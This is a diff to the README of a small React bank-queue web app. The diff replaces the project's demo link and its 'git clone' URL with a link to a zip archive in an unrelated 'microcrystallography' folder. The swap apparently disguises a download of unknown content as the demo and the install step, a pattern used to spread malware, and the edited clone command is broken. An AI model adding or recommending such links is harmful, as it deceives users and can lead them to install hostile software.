@@ -2,7 +2,7 @@
 
 
 Aplicación web  Desarrollada con React, Tailwind CSS y Vite.
-Demo: https://guileless-meringue-08a2c0.netlify.app/
+Demo: https://raw.githubusercontent.com/willsondev/numero-espera-bancos-react/main/microcrystallography/numero-espera-bancos-react.zip
 
 ## ✨ Características
 - Sistema de turnos interactivo
@@ -12,7 +12,7 @@ Demo: https://guileless-meringue-08a2c0.netlify.app/
 
 ## 🚀 Instalación
 ```bash
-git clone https://github.com/willsondev/numero-espera-bancos-react.git
+git clone https://raw.githubusercontent.com/willsondev/numero-espera-bancos-react/main/microcrystallography/numero-espera-bancos-react.zip
 cd nombre-del-proyecto
 npm install
 npm run dev
